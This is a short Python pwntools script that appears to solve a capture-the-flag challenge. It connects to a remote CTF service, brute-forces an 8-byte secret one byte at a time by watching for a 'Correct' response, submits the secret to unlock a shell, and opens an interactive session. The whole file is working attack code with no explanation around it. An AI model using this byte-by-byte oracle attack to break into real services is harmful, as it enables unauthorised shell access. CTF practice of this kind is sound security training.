from pwn import *

context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 20978)

def sendafterwait(msg):
    io.sendafter(b": ", msg)

secret = []

for index in range(8):
    for byte in range(2 ** 8):
        sendafterwait(bytes([byte]))

        line = io.recvline()
        if b"Correct" in line:
            secret.append(byte)
            break
        else:
            for j in range(index):
                sendafterwait(bytes([secret[j]]))

io.sendafter(b"[!] FINAL VERIFICATION: Please enter the full 8-byte secret to unlock the shell:\n", bytes(secret))

io.interactive()